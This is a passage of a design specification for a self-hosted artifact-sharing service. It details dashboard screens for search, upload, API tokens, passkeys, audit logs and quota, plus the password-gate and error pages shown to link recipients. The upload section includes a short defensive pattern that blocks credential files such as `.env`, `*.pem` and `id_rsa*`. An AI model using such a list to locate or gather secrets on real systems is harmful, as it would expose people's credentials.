  - *Over quota* — a banner at the top making the connection explicitly: emptying the trash frees `trashBytes` and is the fastest way back under quota.
  - *Loading / error* — as 11.5.
- **Interactions**
  - **Restore** — `POST /api/v1/artifacts/{name}/restore`. The confirm states the asymmetry: versions come back, share links and grants do not, and anyone who held a link stays locked out until a new one is made (§5.11). Optimistic removal from the table, toast linking to the restored artifact.
  - **Delete permanently** — the strongest confirmation in the product (11.29.6, type-to-confirm variant): the artifact name must be typed. Copy states that every version and every file unique to it goes, and that this cannot be undone. `DELETE /api/v1/artifacts/{name}?purge=true`.
  - **Empty trash** — the same type-to-confirm, with the phrase `empty trash`, naming the count and the bytes freed.
  - No bulk restore. Restoring is per artifact because each may need a rename.
- **Copy references** — §12.5 (11.15), §12.6 for both destructive confirmations.

---

## 11.16 — Search and command palette

- **Purpose** — Find an artifact by name, title, description, or tag from anywhere, in one keystroke, and jump to it.
- **Route** — `/~/search?q=…` for the full-page results view; `⌘K` / `Ctrl-K` opens the palette overlaying any screen without changing the route.
- **Entry points** — `⌘K`; `/` when no input is focused; the top-bar search field; the results link at the bottom of the palette.
- **Permissions** — Any session. Search is scoped to the caller's own artifacts plus anything granted to them. **There is no instance-wide search, including for root** (§8.7); the palette states this in its footer once, on first use.
- **Layout** — The palette is a 640px overlay pinned 15% from the top, over a dimmed backdrop. One input, then grouped results, then a footer of key hints. The full-page view is 11.5's table with the query in the filter bar.

```
┌──────────────────────────────────────────────────────────────┐
│ 🔍 postcal                                                   │
├──────────────────────────────────────────────────────────────┤
│ ARTIFACTS                                                    │
│ ▣ postcal          ◆ Link active · exp 7 Sep 2026     ⏎      │
│    Q4 posting calendar · bundle · grokbot@hosta            │
│ ▤ q3/postcal-old   ○ Private                                 │
├──────────────────────────────────────────────────────────────┤
│ ACTIONS                                                      │
│ ↗ Upload a file                                              │
│ ⚿ Create an API token                                        │
│ 🗑 Open trash                                                 │
├──────────────────────────────────────────────────────────────┤
│ ↑↓ navigate   ⏎ open   ⌘⏎ new tab   esc close   → all results│
└──────────────────────────────────────────────────────────────┘
```

- **Components** — Results from `GET /api/v1/artifacts?q=…&limit=8` with the `q` ranking of §8.7. Each row carries the **same sharing-state component as everywhere else** — a search result showing a private artifact and one showing a live link must be distinguishable at a glance without opening either. Actions group: static navigation commands, filtered by the same query string. Recent-artifacts group when the query is empty, from the last 8 `updatedAt` items.
- **States**
  - *Empty query* — recents plus the actions list.
  - *Searching* — a thin progress line under the input; previous results stay visible rather than blanking (queries are debounced 150 ms).
  - *No matches* — "No artifacts match *postcal*." plus the standing explanation that search covers names, titles, descriptions, and tags — **never the contents of files** — with a link to §12.4's explanation of why. This is where a user first meets P5 in anger, so the copy is load-bearing.
  - *Rate limited* — `429` on the `search` bucket → the input keeps working, results show a retry line with the countdown.
  - *Error* — an inline row with **Retry**; the palette never closes on an error.
- **Interactions** — Type-ahead is fully keyboard-driven: `↑`/`↓`, `⏎` opens (11.7), `⌘⏎` opens the artifact URL in a new tab, `→` or clicking "all results" navigates to `/~/search?q=…` and closes the overlay. `Esc` closes and restores focus to the element that opened it. Selecting an action executes it and closes.
- **Copy references** — §12.5 (11.16), §12.4 for the "why search cannot read files" page.

---

## 11.17 — Upload from the browser

- **Purpose** — Let a human post an artifact without an agent or the CLI: a report to hand over, a folder someone emailed, a first thing to look at.
- **Route** — `/~/upload`
- **Entry points** — The **Upload** button in the top bar; 11.6's secondary action; the `⌘K` action.
- **Permissions** — Any session, own space only.
- **Layout** — Single centred column, 720px. A drop zone above the fold, then, once files are chosen, a metadata form and a file table below it. The primary button is fixed to the bottom of the column so it stays reachable with a long file list.
- **Components**
  - Drop zone accepting files and directories (`webkitdirectory`), preserving relative paths as the manifest's `path` values.
  - Name field — pre-filled from the dropped directory name or the single file's stem, lowercased and normalised to the §5.3 pattern with the transformation shown live. Validation mirrors `^[a-z0-9][a-z0-9._-]*(/…)*$`.
  - Title, description, tags, TTL — all optional, all explicit. **No field is ever auto-filled from file contents.**
  - Entry file selector, defaulting per §5.5 and shown only when more than one file is present.
  - File table: path, size, type, and a per-file status once uploading. Client-side hashing (SHA-256, in a worker) produces the manifest, so the declare call can skip files the server already has.
  - A standing note beside the primary button: posting does not share anything; the artifact will be private (§9.6).
- **States**
  - *Idle* — drop zone only.
  - *Hashing* — a determinate bar over the file count; large files hash visibly slowly and the copy says so.
  - *Uploading* — per-file progress from the `PUT /api/v1/files/{sha256}` calls, up to 4 concurrent from a browser; a `skipped` summary line ("2 of 3 files already on the server").
  - *Committing* — one indeterminate step.
  - *Refused locally* — a path failing §6.4 normalisation, or a dotfile, is rejected before any upload with the offending path named. `.env`, `*.pem`, `*.key`, `id_rsa*` are refused with the loud secret warning of §9.4.2 and cannot be forced from the browser at all — the browser has no `--force-secrets`, deliberately.
  - *Errors* — `409 name_taken` (offer **Overwrite as a new version** or a different name, stating that overwriting keeps the old version); `413 quota_exceeded` (with current, projected, and quota bytes from `detail`, and a link to 11.25); `413 file_too_large`; `413 too_many_files`; `422 invalid_name`; `422 path_case_collision` naming both paths; `507 disk_full`.
  - *Interrupted* — a failed upload leaves the session resumable; the screen offers **Resume**, calling `GET /api/v1/uploads/{id}` for fresh signed URLs (§5.4).
- **Interactions** — On commit, navigate to 11.7 for the new artifact with a toast carrying **Copy URL**. Never auto-open the share dialog: posting and sharing are separate decisions, and joining them here would undo the whole shape of §11.13.
- **Copy references** — §12.5 (11.17), §12.8 for the upload error codes.

---

## 11.18 — API tokens

- **Purpose** — Create, inspect, scope, and revoke the credentials agents use; make it obvious which agent is which and what each can do.
- **Route** — `/~/tokens`
- **Entry points** — Sidebar; 11.6's first checklist item; the "view all" link on an artifact's posted-by card; 11.27's setup instructions.
- **Permissions** — Any session for its own tokens. Creating requires the session (tokens with `account:admin` can create tokens over the API; the dashboard path is always a session).
- **Layout** — Header with **New token**, then a table of live tokens, then a collapsed section of revoked ones.

```
┌──────────────────────────────────────────────────────────────────────────┐
│  API tokens                                            [ + New token ]   │
├──────────────────────────────────────────────────────────────────────────┤
│  NAME                 PREFIX        SCOPES              LAST USED    ⋯   │
│  ⬡ grokbot@hosta    shr_7Fq2mR8v  read write ⚠share   2h ago       ⋯   │
│                       created 3 Aug 2026 · 412 artifacts posted          │
│  ⬡ claude-code@mini   shr_9Kd1pQ4x  read write          12m ago      ⋯   │
│  ⬡ ci@github          shr_2Bn8vT6z  read write          never        ⋯   │
├──────────────────────────────────────────────────────────────────────────┤
│  Revoked (2)                                                         ▾   │
└──────────────────────────────────────────────────────────────────────────┘
```

- **Components** — `GET /api/v1/tokens`: `id`, `name`, `displayPrefix`, `scopes[]`, `createdAt`, `lastUsedAt`, `expiresAt`, `revokedAt`. Artifact counts per token from the same response. Scope chips, with `share:create` always rendered in a warning treatment. Row menu: Edit scopes, Rename, View activity (11.23 filtered by `tokenId`), View artifacts (11.5 filtered by `token`), Revoke.
- **New token dialog** — name (required, with the convention `agent@machine` shown as placeholder), scope checkboxes with one line each from §12.2, optional expiry. `share:create` is unchecked by default and checking it expands an inline warning (§12.6): this token will be able to make your artifacts reachable by anyone with a URL, without asking you. `artifacts:delete` carries its own line: this token can permanently delete, skipping the trash.
- **Created state** — the token in a monospace block, shown once, with **Copy**, and beneath it a ready-to-paste MCP configuration block with the token substituted and the host filled in. A **Done** button is the only exit; the same one-time treatment as 11.13.7 down to the wording pattern.
- **States** — *Empty* (a first-token card pointing at both the dashboard flow and the device-code flow of 11.26); *never used* ("never" in the last-used column, not a dash); *expired* (greyed with the date); *revoked* (in the collapsed section with revocation time and actor); *loading/error* as usual.
- **Interactions** — **Revoke** is a destructive confirm naming what breaks: the agent using it stops working immediately, and its artifacts and versions remain and stay attributed to it. `DELETE /api/v1/tokens/{id}`; optimistic move to the revoked section. **Edit scopes** is `PATCH /api/v1/tokens/{id}`, audited as `token.scope_change`, and adding `share:create` re-shows the warning and requires an explicit confirm.
- **Copy references** — §12.5 (11.18), §12.6 for the scope warnings.

---

## 11.19 — Passkeys and sessions

- **Purpose** — Manage the credentials and browser sessions that can reach this account.
- **Route** — `/~/security`
- **Entry points** — User menu; 11.6's checklist; 11.20; the counter-regression email.
- **Permissions** — Any session, own account only. A recovery-restricted session (§4.5) may list and register only; every other control renders disabled with an explanation.
- **Layout** — Two stacked sections in a 760px column: **Passkeys**, then **Sessions**, then a **Recovery code** card.
- **Components**
  - Passkeys from `GET /api/v1/auth/passkeys`: `name`, `createdAt`, `lastUsedAt`, `backupState` (shown as "syncs across your devices" / "this device only"), `transports`. Actions: Rename, Revoke. **Add a passkey** → 11.3.
  - Sessions from `GET /api/v1/auth/sessions`: created, last seen, coarse user agent, IP, which passkey signed in, and a **This device** marker (§4.4). Actions: Revoke; **Sign out everywhere**.
  - Recovery-code card: whether one is outstanding and when it was generated, with **Generate a new code** — which invalidates the old one and shows the new one exactly once behind a saved-it checkbox.
- **States** — *One passkey only* — a persistent advisory at the top of the section: with a single passkey, losing it means recovery-code or server-side recovery (§4.5); **Add another** is promoted. *Revoking your last passkey* — refused in the UI with an explanation, not merely disabled. *Revoking the passkey that created this session* — the confirm states you will be signed out. *Recovery code never generated* — the card is amber.
- **Interactions** — Revoking a passkey revokes every session created with it (§4.4); the confirm names how many sessions that is. **Sign out everywhere** revokes all sessions including the current one and returns to 11.1.
- **Copy references** — §12.5 (11.19).

---

## 11.20 — Security overview

- **Purpose** — One page answering "is anything wrong": recent authentication activity, anomalies, and everything currently reachable without a sign-in.
- **Route** — `/~/security/overview`
- **Entry points** — User menu; anomaly notification emails; the banner an anomaly raises on 11.5.
- **Permissions** — Any session, own account. The root user additionally sees instance-level rows (failed auth across the instance, backup state) via `scope=instance`.
- **Layout** — A grid of four cards above the fold, then a recent-events list.
- **Components**
  - **Reachable without sign-in** — the count of artifacts with at least one live link, from `GET /api/v1/artifacts?hasLink=true`, each listed with its absolute expiry, sorted by soonest. This card is first because it is the answer to the question this product's threat model is built around.
  - **Recent sign-ins** — `GET /api/v1/audit?action=auth.&limit=10`, successes and failures, with IP and coarse user agent.
  - **Anomalies** — the §10.4 signals raised in the last 7 days: unusual link creation, first link by a token, bulk posting, bulk trashing, a token seen from a new IP, recovery-code use, counter regression. Each names the token and links to 11.23 filtered to it.
  - **Tokens** — count of live tokens, how many hold `share:create`, and the last-used spread. Links to 11.18.
- **States** — *All clear* (an explicit "nothing unusual in the last 7 days" rather than empty cards); *anomaly present* (the card takes the warning treatment and the sidebar item gets a dot); *root instance view* (a toggle between "my account" and "instance"); *loading/error* per card independently — one failing card must not blank the page.
- **Interactions** — Each anomaly row offers **Revoke this token** inline, going through 11.18's confirm. **Revoke all share links** is present here as the dashboard equivalent of `sharectl panic` (§10.5), with type-to-confirm and a count of what will die.
- **Copy references** — §12.5 (11.20), §12.6 for anomaly descriptions.

---

## 11.21 — Settings

- **Purpose** — The few per-user choices that exist, and nothing more.
- **Route** — `/~/settings`
- **Entry points** — User menu; links from 11.10 (retention), 11.13 (default TTL and notifications), 11.24 (staleness window).
- **Permissions** — Any session, own account.
- **Layout** — A 720px single column of labelled groups, each setting one row with its control right-aligned and its explanation beneath the label. Changes save on change, not on a Save button — every setting here is independently and instantly revertible.
- **Components** — `GET /api/v1/settings` / `PATCH /api/v1/settings`:
  | Group | Setting | Key | Default |
  | --- | --- | --- | --- |
  | Profile | Display name, email (read-only, changed by the operator), handle (read-only) | — | — |
  | Sharing | Default share-link duration — the preset marked "your default" on 11.13 | `defaultShareTtl` | `14d` |
  | Sharing | Email me when a share link is created | `notifyOnShare` | on |
  | Sharing | Email me 24 hours before a link expires | `notifyOnLinkExpiring` | on |
  | Versions | Keep last / keep days / keep pinned / minimum (§8.3) | `versionRetention` | 20 / 365 / true / 3 |
  | Staleness | Not-opened window driving 11.24 | `staleDays` | 90 |
  | Notifications | Quota warnings, token created, anomaly alerts | `notify*` | on |
  | Display | Time zone for displayed timestamps: UTC or the browser's zone | `timeZone` | UTC |
- **States** — *Saving* (a per-row spinner, then a check that fades); *save failed* (the control reverts and an inline error appears); *cannot be disabled* (recovery-code use and counter regression render as fixed "always on" rows with a one-line reason — §10.8); *no permanent-link setting* (the sharing group carries a standing line: every share link expires; there is no setting for that, §2.7).
- **Interactions** — Lowering `versionRetention` shows what it would prune, by count, before it applies; the prune itself happens on the nightly job, and the copy says so rather than implying an immediate effect.
- **Copy references** — §12.5 (11.21).

---

## 11.22 — Users and invites (root only)

- **Purpose** — Create and disable the small set of people who have accounts on this instance.
- **Route** — `/~/users`
- **Entry points** — User menu, visible only when `user.isRoot`; 11.6's root checklist item.
- **Permissions** — Root, or a user holding `account:admin` (§4.8). Anyone else gets the in-shell not-found block — not a "you are not allowed" page, which would confirm the route exists.
- **Layout** — Two tables: **Users**, then **Pending invites**.
- **Components** — Users from `GET /api/v1/users`: handle, display name, email, `isRoot`, `createdAt`, `lastSeenAt`, artifact count, storage used against quota. Invites from `GET /api/v1/invites`: email, handle, invited by, `expiresAt`, state. **Invite someone** dialog: email plus handle, with live validation against the reserved list (§6.3) and the handle pattern, and a preview of the space they will get (`share.c52.com/~sarah`).
- **States** — *Only you* (a one-line explanation that Share has no public sign-up, §1.4 N4); *invite pending* (with **Resend** and **Revoke**); *invite expired* (greyed, **Revoke** only, with a note that invites live 7 days); *rate limited* (`invite`, 10/day → the button disables with a countdown); *disabled user* (greyed row, with the note that all their sessions and tokens are revoked and their artifacts remain).
- **Interactions** — **Disable** is a destructive confirm stating exactly what happens: sessions and tokens revoked, artifacts retained, links on their artifacts continue to serve until they expire — and offering **Revoke their share links too** as a checkbox inside the confirm. There is no delete-user action in the dashboard; that is a `sharectl` operation, and the copy says so.
- **Copy references** — §12.5 (11.22).

---

## 11.23 — Audit log

- **Purpose** — The searchable record of everything that happened, and the evidence for P3.
- **Route** — `/~/audit`, with every filter in the query string.
- **Entry points** — Sidebar (Agents group); "view activity" from 11.18, 11.20, and any artifact.
- **Permissions** — Any session sees their own events. Root may switch to `scope=instance`.
- **Layout** — A filter bar over a dense table. Rows are one line with an expander revealing the full `metadata` JSON.
- **Components** — `GET /api/v1/audit?action=&actorType=&tokenId=&targetId=&from=&to=&q=`: time (absolute, seconds precision), action, actor (user handle, token name and prefix, or "system"), target label, IP, and the expander. Filters: action (a picker grouped by domain per §10.7, supporting prefix values like `link.`), actor type, token, date range, free text on `target_label`. A **Sharing only** shortcut sets `action=link.` — the most common reason to open this screen.
- **States** — *Empty for filters* (with **Clear filters**); *loading* (skeleton rows); *export running* (`GET /api/v1/audit/export?format=ndjson` triggers a download; the button shows progress and the copy notes it streams the current filter); *root instance mode* (a toggle with the scope stated in a strip, since instance mode shows other users' actions).
- **Interactions** — Cursor pagination with **Newer** / **Older**, never page numbers. Clicking an actor filters by it; clicking a target opens the artifact when it still exists, and otherwise shows the denormalised `target_label` with a note that the target was deleted — which is why `target_label` exists.
- **Copy references** — §12.5 (11.23), §12.2 for what each action name means.

---

## 11.24 — Staleness — things you have not opened

- **Purpose** — Show what has not been looked at in a long time so the owner can decide to delete it. Nothing here deletes on its own (§8.6).
- **Route** — `/~/stale`
- **Entry points** — The quiet line at the foot of 11.5; the storage screen; the `⌘K` action.
- **Permissions** — Any session, own space.
- **Layout** — A header stating the rule and the total, then 11.5's table sorted by size descending, with a bulk-action bar that appears on selection.
- **Components** — `GET /api/v1/artifacts?stale=true&sort=size_desc`. The header reads "34 artifacts you haven't opened in 90 days · 2.1 GB", with the window linking to 11.21. Every row shows `lastViewedAt` (absolute, with "never viewed" where null) and its sharing state — a stale artifact with a live link is a different decision from a stale private one, so both facts sit side by side.
- **States** — *Nothing stale* (a plain confirmation, no call to action); *excluded items explained* (a footnote: pinned artifacts and anything with a live link or grant are never listed, §8.6); *loading/error* as 11.5.
- **Interactions** — Multi-select → **Move selected to trash**, one confirm naming the count, the total bytes, and the 30-day restore window. Requests are issued sequentially with a progress line; a partial failure leaves the successful ones removed and names the failures. Per-row **Keep** sets `pinned: true`, which removes it from this view permanently and says so.
- **Copy references** — §12.5 (11.24).

---

## 11.25 — Storage and quota

- **Purpose** — Show what is using space, what would free some, and how close to the ceiling the user is.
- **Route** — `/~/storage`
- **Entry points** — The sidebar's storage meter; the over-quota banner; quota emails.
- **Permissions** — Any session, own account. Root additionally sees instance disk figures.
- **Layout** — A quota meter above the fold with the three numbers that matter, then two lists: **Largest artifacts** and **What would free space**.
- **Components** — `GET /api/v1/status`: `storageBytes`, `quotaBytes`, `artifactCount`, `trashBytes`, `staleBytes`, and, for root, `diskFreeBytes` and `lastBackupAt`. Largest artifacts from `?sort=size_desc&limit=20`. The "what would free space" list has exactly three rows: trash (`trashBytes`, → 11.15), stale artifacts (`staleBytes`, → 11.24), and old versions (an estimate from retention settings, → 11.21). Each names a number and a destination; none acts directly from here.
- **States** — *Under 80%* (neutral meter); *80–95%* (amber, with a line stating that email warnings are sent at most daily); *over 95%* (red); *at 100%* (red, with §10.3's rule stated plainly: posting fails, reading, sharing, and deleting continue); *dedup note* (a standing footnote that identical files are stored once instance-wide but each user is charged for every file their artifacts reference, §3.9 — the only honest way to explain a number that will not match a naive sum).
- **Interactions** — Read-only apart from navigation. `sharectl recompute-quota` is named in the footnote for the operator, since a drifted counter is an operator fix, not a user one.
- **Copy references** — §12.5 (11.25).

---

## 11.26 — Device authorization

- **Purpose** — Approve an agent's device-code request, with the human seeing what they are granting before they grant it.
- **Route** — `/~/authorize`, optionally `?code=QRTZ-8H4M` from a link the agent printed.
- **Entry points** — An agent's printed instruction (§4.6.2); `share login`; the sidebar's help page.
- **Permissions** — Any session. Unauthenticated visitors go to 11.1 with `next` preserved, then land back here with the code intact.
- **Layout** — Centred card, 480px. A single large code input, then, once matched, the approval panel.
- **Components**
  - Code input: eight characters, `XXXX-XXXX`, auto-uppercased, hyphen inserted automatically, paste-tolerant. `POST /api/v1/auth/device/lookup` with the user code returns the pending request's `name`, `createdAt`, and requested scopes.
  - Approval panel: the agent's declared name (`claude-code@hosta`), the request's source IP and coarse user agent, the scopes it will receive — always the agent default set, `artifacts:read` and `artifacts:write` — and an explicit line: **this token will not be able to create share links**. Buttons **Approve** and **Deny**.
- **States** — *No code entered*; *unknown or expired code* (`404`/`410` → one message, no distinction, with a line telling them to run the command again); *already approved*; *approved* (a terminal confirmation telling them to return to their terminal — the token itself is never shown here, it goes to the polling agent); *denied* (terminal, states the agent will report a refusal); *rate limited* (`device_start`, 10/hour/IP).
- **Interactions** — **Approve** issues the token server-side and audits `token.device_authorize`; the panel then offers **Manage this token** → 11.18, which is where scopes can be elevated deliberately (§4.6.2).
- **Copy references** — §12.5 (11.26).

---

## 11.27 — Help and agent setup

- **Purpose** — Everything an owner needs to point an agent at this instance, and short answers to the questions the design deliberately creates.
- **Route** — `/~/help`, `/~/help/agents`
- **Entry points** — Sidebar footer; 11.6; the empty state on 11.18; contextual "why?" links throughout.
- **Permissions** — Any session. Content is identical for every user; only the hostname and handle in the examples are substituted.
- **Layout** — A two-column documentation layout: a sticky section nav at left (200px), content at right (max 760px). Collapses to a top dropdown nav below 900px.
- **Components** — Content from §12.4, rendered client-side from bundled Markdown — no content is fetched from the network and none is generated. `/~/help/agents` carries copy-paste configuration blocks for Claude Code, Cursor, Codex, Cline, and a generic MCP host, each with `https://share.c52.com/mcp` filled in and a visible `shr_…` placeholder (§9.8), plus the CLI install line and the `share login` flow. Every block has a **Copy** control.
- **States** — *Anchor deep-link* (a `#fragment` scrolls and highlights); *no token yet* (a callout at the top of `/~/help/agents` with **Create a token** → 11.18); *printing* (the nav is hidden and blocks wrap rather than scroll).
- **Interactions** — Purely navigational. Three help topics are linked from elsewhere often enough to be named here: why search cannot read file contents (P5), why every share link expires (P4), and what happens when an agent overwrites an artifact that has a live link (§7.2).
- **Copy references** — §12.4 in full.

---

## 11.28 — Instance status

- **Purpose** — The operator's at-a-glance health check, inside the app rather than over SSH.
- **Route** — `/~/status`
- **Entry points** — User menu (root only); the R6 maintenance page's suggestion to retry; the backup-failure email.
- **Permissions** — Root sees everything. A non-root user sees a reduced version: version string, uptime, and their own quota — enough to answer "is it me or is it the server" without disclosing host details.
- **Layout** — A row of status tiles, then a table of subsystem checks, then a recent-jobs list.
- **Components** — `GET /api/v1/status`: `version`, `uptimeSeconds`, `diskFreeBytes` and percentage, `queueDepths` (precompression, view flush, sweeps), `lastBackupAt` and its outcome, `migrationRevision`, plus per-subsystem states for Postgres, Redis, the file root, and the worker. Recent system audit events (`system.`) from 11.23.
- **States** — *All green*; *degraded* (any tile amber, with the specific check named); *disk over 85%* (red tile matching the §10.8 notification); *backup stale or failed* (red, with the last successful time absolute); *worker behind* (queue depth over a threshold, stating that view counts and precompression lag but nothing is lost); *unreachable* (if this screen's own fetch fails, the app has already shown the global connection-lost banner from 11.29.10).
- **Interactions** — Read-only. No restart, no flush, no destructive control: those are `sharectl`, and putting them behind a browser session would widen the blast radius of a stolen cookie for no real gain. The screen names the relevant `sharectl` command beside each subsystem instead.
- **Copy references** — §12.5 (11.28).

---

# Recipient-facing and error pages (R1–R7)

These seven pages are served by the API (R6 by Caddy) as complete HTML documents with **inline
CSS, no JavaScript, no external requests, and no dashboard chrome**. They must render correctly
with scripting disabled, with a blocked font, and in a text browser. They carry
`Cache-Control: no-store`. None of them links to the dashboard, none names the instance's owner,
and none reveals an artifact's name unless the visitor is already authorised to see it.

Shared shell: a centred column, max 420px, vertically centred, system font stack, one wordmark
line at the top (`share.c52.com`, plain text), and nothing else. §13 gives the exact inline
style block; it is byte-identical across R1–R7 so that page identity cannot be inferred from
CSS differences.

## R1 — Share-link password gate

- **Purpose** — Take a password for one share link, and nothing else.
- **Route** — Any path under `/s/{token}` when the link has a password and the request carries no valid recipient session. Status **401**, code `recipient_auth_required`.
- **Permissions** — Anyone holding the URL.
- **Layout**

```
┌────────────────────────────────────┐
│           share.c52.com            │
│                                    │
│   This link needs a password.      │
│                                    │
│   [ Password                    ]  │
│                                    │
│   [        Continue             ]  │
│                                    │
└────────────────────────────────────┘
```

- **Components** — A `<form method="post" action="/s/{token}/unlock">` with `<input type="password" name="password" autocomplete="current-password" autofocus>` and a submit button. That is the entire page. **No JavaScript participates in submission**: the form works exactly as written with scripting disabled (§7.4), which is the hard requirement for this page.
- **What is deliberately absent** — the artifact's name, title, kind, size, or thumbnail; the owner's handle or display name; who sent it; how long the link has left; any branding beyond the hostname; any link anywhere else in the product (§7.6). A visitor who guesses a token learns only that some link exists.
- **States**
  - *First view* — 401 with the form.
  - *Wrong password* — re-render at 401 with one line above the field: the password is not correct. No count of remaining attempts, no distinction from a first view beyond that line.
  - *Rate limited* — 429 (buckets `link_password` 10/IP/hour, `link_password_link` 50/link/hour, §10.2.2). A plain page stating too many attempts and naming the `Retry-After` interval in minutes. The owner is emailed the first time a link's bucket empties.
  - *Link expired or revoked between load and submit* — 410 → R3.
  - *Correct* — set the recipient cookie `share_r_{prefix}` scoped to `Path=/s/{token}` (§4.7) and `302` to the originally requested path.
- **Interactions** — Submit only. `Enter` in the field submits natively. The form posts form-encoded; the same endpoint also accepts JSON so a scripted client can unlock, but the page itself never uses that path.
- **Copy references** — §12.7 (R1).

## R2 — Share-link landing for a non-HTML artifact

- **Purpose** — Give a recipient a sane page for a PDF, image, video, or file, instead of dropping raw bytes on them with no context.
- **Route** — `/s/{token}` where the resolved artifact's `kind` is not `page` or `bundle`. Status **200**.
- **Permissions** — A valid recipient session for that link.
- **Layout** — The shared shell, slightly wider (560px): title line, one metadata line, a preview element sized to the viewport, and two buttons.
- **Components** — The artifact's `title` **if the owner set one**, otherwise nothing in that position — never the file name dressed up as a title, and never a generated one. Below it: kind, file count, total size. Preview: `<img>` for images, `<video controls>` for video (range requests make seeking work, §6.6.4), an `<iframe>` for PDFs, and no preview at all for other kinds. Buttons: **View** (the file itself, same tab) and **Download** (`?download=1`, which sets `Content-Disposition: attachment`).
- **States** — *No title set* (the metadata line stands alone); *multi-file, no entry point* (the body is R7's listing inside this shell); *unrenderable* (download-only, with the content type stated); *expired mid-session* (the next request is R3).
- **Interactions** — Two links. No sharing controls, no copy-URL affordance, no account prompt: a recipient is never invited to become a user (§4.7).
- **Copy references** — §12.7 (R2).

## R3 — Link expired or revoked

- **Purpose** — Tell someone who was legitimately given a link that the link has ended — the single deliberate exception to P1's blanket 404.
- **Route** — `/s/{token}` and anything beneath it, when the link is past `expires_at`, revoked, burned past `maxViews`, or its artifact was trashed. Status **410**, code `link_expired`.
- **Permissions** — Anyone holding the URL.
- **Layout** — The shared shell: one heading, one sentence, nothing else.
- **Components** — "This link is no longer active." plus one line suggesting they ask whoever sent it for a new one. **No artifact name, no owner, no expiry date, no reason** — expired, revoked, burned, and trashed are indistinguishable (§7.6). No retry control, since there is nothing to retry.
- **States** — One. There are no variants, deliberately: a differing page would leak which of the four things happened.
- **Interactions** — None. The page has no controls at all.
- **Copy references** — §12.7 (R3).

## R4 — Not found

- **Purpose** — The universal answer for anything the visitor may not have. Status **404**.
- **Route** — Any artifact path that does not resolve, resolves to something the visitor cannot view, has an expired TTL, is trashed, or names a missing file inside a visible artifact.
- **Permissions** — Everyone, in every state.
- **Layout** — The shared shell: heading, one sentence.
- **Components** — "Not found." and one neutral line. **Byte-identical for every cause** (P1): the body, the headers, and the status must not differ between "no such artifact" and "not yours", and negative resolutions are cached with the same TTL as positive ones so the timing matches too (§6.5.2). No sign-in link — offering one would tell an unauthenticated scanner that signing in might help.
- **States** — One, with one exception that is not a state change: if an artifact defines its own `/404.html`, that file is served with status 404 in place of this page for paths inside that artifact (§6.6.1). A signed-in owner hitting a missing path inside their own artifact sees the same page; the dashboard's in-shell not-found block (11.29.10) is a different surface entirely.
- **Interactions** — None.
- **Copy references** — §12.7 (R4).

## R5 — Rate limited

- **Purpose** — Say that too many requests arrived and when to come back. Status **429**.
- **Route** — Any surface: artifact paths, `/s/*`, the API (which returns the JSON envelope instead when the client accepts JSON), the dashboard.
- **Layout** — The shared shell.
- **Components** — One heading, one sentence naming the wait in minutes derived from `Retry-After`. The bucket name is **not** shown to recipients; it appears only in `detail.bucket` on API responses, where an agent can act on it (§10.2).
- **States** — Two: an anonymous or recipient visitor gets the plain page; a signed-in dashboard user gets the in-app version (11.29.10) with a live countdown, because they can usefully wait in place.
- **Interactions** — None on the static page.
- **Copy references** — §12.7 (R5).

## R6 — Maintenance

- **Purpose** — Answer when the API is down, without the API. Status **503**.
- **Route** — Served by Caddy from a static file when `forward_auth` fails or the socket is unreachable (§2.4.1).
- **Layout** — The shared shell.
- **Components** — One heading, one sentence, and no timestamp — a static file cannot know when service resumed and a stale estimate is worse than none. No auto-refresh meta tag: an unattended tab reloading a downed service is exactly the traffic an operator does not need mid-incident.
- **States** — One.
- **Interactions** — None. This page is a file on disk with no dependencies; it must render if Postgres, Redis, and the API are all gone.
- **Copy references** — §12.7 (R6).

## R7 — Artifact file listing

- **Purpose** — Show the contents of a bundle that has no entry point, as a plain index. Status **200** (§6.6.2).
- **Route** — The root of any artifact whose live version resolves no `entry_path`, at whichever address the visitor reached it by: `/name`, `/~handle/name`, or `/s/{token}`.
- **Permissions** — Whoever could reach the artifact. **Listings exist only for the artifact being addressed** — there is no listing of a space, ever, for anyone.
- **Layout**

```
┌──────────────────────────────────────────────┐
│  share.c52.com                               │
│                                              │
│  postcal                                     │
│  3 files · 110 KB                            │
│  ────────────────────────────────────────    │
│  index.html                text/html  18 KB  │
│  style.css                  text/css  4.1 KB │
│  img/chart.png            image/png  88.1 KB │
└──────────────────────────────────────────────┘
```

- **Components** — The artifact `name` (or `title` when set), the file count and total size, then one row per file: path, content type, size — each path a relative link so it resolves under whichever address is in the bar, including `/s/{token}/…` (§7.6). Sorted by path, directories grouped, using the same inline CSS as R3–R6.
- **States** — *Reached through a share link* (identical page; the heading shows the title only if set, and never the owner's handle); *single file* (cannot occur — §5.5 rule 4 always assigns an entry path); *empty version* (cannot occur — a version has at least one file).
- **Interactions** — Links only. No sorting, no search, no download-all: those need JavaScript or an API call, and this page has neither.
- **Copy references** — §12.7 (R7).

---

## 11.29 — Global patterns

### 11.29.1 App shell

Everything under `/~/` except 11.1–11.4 renders inside one shell: a fixed 240px sidebar, a 56px top bar, and a scrolling main region.

**Sidebar**, top to bottom:

| Group | Items |
| --- | --- |
| Wordmark | `Share` → `/~/artifacts` |
| **Library** | Artifacts (11.5), Shared with me (11.14, hidden until the instance has more than one user), Trash (11.15) |
| **Agents** | API tokens (11.18), Audit log (11.23) |
| Footer | Storage meter — a thin bar with `storageBytes / quotaBytes` → 11.25; then the user chip |

Counts appear beside Trash and Shared with me only when non-zero. A dot appears beside Audit log when 11.20 has an unacknowledged anomaly.

**Top bar**: a search input that opens the 11.16 palette on focus, the **Upload** button (11.17), and the user menu.

**User menu**: display name, handle, and email; then Settings (11.21), Security (11.19), Security overview (11.20), Users (11.22, root only), Instance status (11.28), Help (11.27), Sign out.

Below 900px the sidebar becomes an off-canvas drawer behind a hamburger; the top bar keeps search and Upload. Below 600px the search input collapses to an icon.

### 11.29.2 The sharing-state indicator

One component, one appearance, everywhere an artifact appears — the list, detail, search results, viewer, shared-with-me, trash, and the create-link summary. Three states, from `visibility` (§7.8):

| State | Glyph | Label | Detail line |
| --- | --- | --- | --- |
| `private` | `○` hollow, neutral | **Private** | "Only you" — or "Only you and anyone you grant" where space allows |
| `granted` | `●` filled, informational | **Shared with 2 people** | Handles, where space allows |
| `shared` | `◆` filled, amber | **Link active** | **Always** the absolute expiry of the soonest-expiring live link: `expires 7 Sep 2026, 18:04 UTC`, with `(in 14 days)` where the container is wide enough |

Rules that hold without exception:

1. When both grants and links are live, `shared` wins — the widest true thing is what gets shown (§7.8).
